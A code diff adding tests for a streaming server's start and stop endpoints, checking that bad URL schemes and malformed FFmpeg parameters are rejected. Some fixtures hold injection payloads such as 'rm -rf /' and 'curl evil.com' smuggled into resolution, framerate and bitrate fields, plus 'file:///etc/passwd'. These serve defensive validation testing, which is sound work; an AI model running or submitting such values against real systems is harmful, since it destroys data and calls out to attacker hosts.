@@ -1285,3 +1285,411 @@ describe("createCustomRtmpDestination()", () => {
     expect(dest.onStreamStop).toBeUndefined();
   });
 });
+
+// ---------------------------------------------------------------------------
+// POST /api/stream/start — backward-compat endpoint security tests
+// ---------------------------------------------------------------------------
+
+describe("POST /api/stream/start (backward-compat)", () => {
+  it("returns 400 when rtmpUrl is missing", async () => {
+    const { res, getStatus, getJson } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({ rtmpKey: "key" }),
+    });
+
+    const handled = await handleStreamRoute(
+      req, res, "/api/stream/start", "POST", mockState(),
+    );
+
+    expect(handled).toBe(true);
+    expect(getStatus()).toBe(400);
+    expect(getJson()).toEqual(
+      expect.objectContaining({ error: expect.stringContaining("rtmpUrl and rtmpKey are required") }),
+    );
+  });
+
+  it("returns 400 when rtmpKey is missing", async () => {
+    const { res, getStatus, getJson } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({ rtmpUrl: "rtmp://example.com/live" }),
+    });
+
+    const handled = await handleStreamRoute(
+      req, res, "/api/stream/start", "POST", mockState(),
+    );
+
+    expect(handled).toBe(true);
+    expect(getStatus()).toBe(400);
+    expect(getJson()).toEqual(
+      expect.objectContaining({ error: expect.stringContaining("rtmpUrl and rtmpKey are required") }),
+    );
+  });
+
+  it("rejects http:// scheme (SSRF prevention)", async () => {
+    const { res, getStatus, getJson } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({ rtmpUrl: "http://internal-service:8080/live", rtmpKey: "key" }),
+    });
+
+    const handled = await handleStreamRoute(
+      req, res, "/api/stream/start", "POST", mockState(),
+    );
+
+    expect(handled).toBe(true);
+    expect(getStatus()).toBe(400);
+    expect(getJson()).toEqual(
+      expect.objectContaining({ error: expect.stringContaining("rtmp:// or rtmps://") }),
+    );
+  });
+
+  it("rejects file:// scheme", async () => {
+    const { res, getStatus } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({ rtmpUrl: "file:///etc/passwd", rtmpKey: "key" }),
+    });
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+    expect(getStatus()).toBe(400);
+  });
+
+  it("rejects javascript: scheme", async () => {
+    const { res, getStatus } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({ rtmpUrl: "javascript:alert(1)", rtmpKey: "key" }),
+    });
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+    expect(getStatus()).toBe(400);
+  });
+
+  it("accepts valid rtmp:// scheme", async () => {
+    const { res, getStatus, getJson } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmp://live.twitch.tv/app",
+        rtmpKey: "live_abc123",
+      }),
+    });
+    const state = mockState();
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", state);
+
+    expect(getStatus()).toBe(200);
+    expect(getJson()).toEqual(expect.objectContaining({ ok: true }));
+    expect(state.streamManager.start).toHaveBeenCalledOnce();
+  });
+
+  it("accepts valid rtmps:// scheme", async () => {
+    const { res, getStatus } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmps://live.twitch.tv/app",
+        rtmpKey: "live_abc123",
+      }),
+    });
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+    expect(getStatus()).toBe(200);
+  });
+
+  // -- FFmpeg parameter validation --
+
+  it("rejects malformed resolution (injection attempt)", async () => {
+    const { res, getStatus, getJson } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmp://live.twitch.tv/app",
+        rtmpKey: "key",
+        resolution: "1280x720;rm -rf /",
+      }),
+    });
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+    expect(getStatus()).toBe(400);
+    expect(getJson()).toEqual(
+      expect.objectContaining({ error: expect.stringContaining("resolution must match") }),
+    );
+  });
+
+  it("rejects resolution with extra characters", async () => {
+    const { res, getStatus } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmp://live.twitch.tv/app",
+        rtmpKey: "key",
+        resolution: "1280x720,pad=1920:1080",
+      }),
+    });
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+    expect(getStatus()).toBe(400);
+  });
+
+  it("accepts valid resolution formats", async () => {
+    for (const resolution of ["1280x720", "1920x1080", "640x480", "3840x2160"]) {
+      const { res, getStatus } = createMockHttpResponse();
+      const req = createMockIncomingMessage({
+        method: "POST",
+        url: "/api/stream/start",
+        body: JSON.stringify({
+          rtmpUrl: "rtmp://live.twitch.tv/app",
+          rtmpKey: "key",
+          resolution,
+        }),
+      });
+
+      await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+      expect(getStatus()).toBe(200);
+    }
+  });
+
+  it("rejects malformed bitrate", async () => {
+    const { res, getStatus, getJson } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmp://live.twitch.tv/app",
+        rtmpKey: "key",
+        bitrate: "2500k && curl evil.com",
+      }),
+    });
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+    expect(getStatus()).toBe(400);
+    expect(getJson()).toEqual(
+      expect.objectContaining({ error: expect.stringContaining("bitrate must match") }),
+    );
+  });
+
+  it("accepts valid bitrate formats", async () => {
+    for (const bitrate of ["1500k", "2500k", "6000k"]) {
+      const { res, getStatus } = createMockHttpResponse();
+      const req = createMockIncomingMessage({
+        method: "POST",
+        url: "/api/stream/start",
+        body: JSON.stringify({
+          rtmpUrl: "rtmp://live.twitch.tv/app",
+          rtmpKey: "key",
+          bitrate,
+        }),
+      });
+
+      await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+      expect(getStatus()).toBe(200);
+    }
+  });
+
+  it("rejects invalid inputMode", async () => {
+    const { res, getStatus, getJson } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmp://live.twitch.tv/app",
+        rtmpKey: "key",
+        inputMode: "x11grab",
+      }),
+    });
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+    expect(getStatus()).toBe(400);
+    expect(getJson()).toEqual(
+      expect.objectContaining({ error: expect.stringContaining("inputMode must be one of") }),
+    );
+  });
+
+  it("accepts valid inputMode values", async () => {
+    for (const inputMode of ["testsrc", "avfoundation", "pipe"]) {
+      const { res, getStatus } = createMockHttpResponse();
+      const req = createMockIncomingMessage({
+        method: "POST",
+        url: "/api/stream/start",
+        body: JSON.stringify({
+          rtmpUrl: "rtmp://live.twitch.tv/app",
+          rtmpKey: "key",
+          inputMode,
+        }),
+      });
+
+      await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+      expect(getStatus()).toBe(200);
+    }
+  });
+
+  it("rejects framerate below 1", async () => {
+    const { res, getStatus } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmp://live.twitch.tv/app",
+        rtmpKey: "key",
+        framerate: 0,
+      }),
+    });
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+    expect(getStatus()).toBe(400);
+  });
+
+  it("rejects framerate above 60", async () => {
+    const { res, getStatus } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmp://live.twitch.tv/app",
+        rtmpKey: "key",
+        framerate: 120,
+      }),
+    });
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+    expect(getStatus()).toBe(400);
+  });
+
+  it("rejects non-integer framerate", async () => {
+    const { res, getStatus } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmp://live.twitch.tv/app",
+        rtmpKey: "key",
+        framerate: 29.97,
+      }),
+    });
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+    expect(getStatus()).toBe(400);
+  });
+
+  it("rejects string framerate", async () => {
+    const { res, getStatus } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmp://live.twitch.tv/app",
+        rtmpKey: "key",
+        framerate: "30; rm -rf /",
+      }),
+    });
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", mockState());
+    expect(getStatus()).toBe(400);
+  });
+
+  it("passes validated parameters to streamManager.start()", async () => {
+    const { res } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmp://live.twitch.tv/app",
+        rtmpKey: "my-key",
+        inputMode: "avfoundation",
+        resolution: "1920x1080",
+        bitrate: "6000k",
+        framerate: 60,
+      }),
+    });
+    const state = mockState();
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", state);
+
+    expect(state.streamManager.start).toHaveBeenCalledWith({
+      rtmpUrl: "rtmp://live.twitch.tv/app",
+      rtmpKey: "my-key",
+      inputMode: "avfoundation",
+      resolution: "1920x1080",
+      bitrate: "6000k",
+      framerate: 60,
+    });
+  });
+
+  it("uses defaults when optional params are omitted", async () => {
+    const { res } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/start",
+      body: JSON.stringify({
+        rtmpUrl: "rtmp://live.twitch.tv/app",
+        rtmpKey: "my-key",
+      }),
+    });
+    const state = mockState();
+
+    await handleStreamRoute(req, res, "/api/stream/start", "POST", state);
+
+    expect(state.streamManager.start).toHaveBeenCalledWith({
+      rtmpUrl: "rtmp://live.twitch.tv/app",
+      rtmpKey: "my-key",
+      inputMode: "testsrc",
+      resolution: "1280x720",
+      bitrate: "2500k",
+      framerate: 30,
+    });
+  });
+});
+
+// ---------------------------------------------------------------------------
+// POST /api/stream/stop — backward-compat endpoint tests
+// ---------------------------------------------------------------------------
+
+describe("POST /api/stream/stop (backward-compat)", () => {
+  it("calls streamManager.stop() and returns ok", async () => {
+    const { res, getJson } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/stop",
+    });
+    const state = mockState();
+
+    const handled = await handleStreamRoute(
+      req, res, "/api/stream/stop", "POST", state,
+    );
+
+    expect(handled).toBe(true);
+    expect(state.streamManager.stop).toHaveBeenCalledOnce();
+    expect(getJson()).toEqual(expect.objectContaining({ ok: true }));
+  });
+
+  it("returns 500 when stop() throws", async () => {
+    const { res, getStatus, getJson } = createMockHttpResponse();
+    const req = createMockIncomingMessage({
+      method: "POST",
+      url: "/api/stream/stop",
+    });
+    const state = mockState();
+    (state.streamManager.stop as ReturnType<typeof vi.fn>).mockRejectedValueOnce(
+      new Error("FFmpeg already exited"),
+    );
+
+    await handleStreamRoute(req, res, "/api/stream/stop", "POST", state);
+
+    expect(getStatus()).toBe(500);
+    expect(getJson()).toEqual(
+      expect.objectContaining({ error: "FFmpeg already exited" }),
+    );
+  });
+});
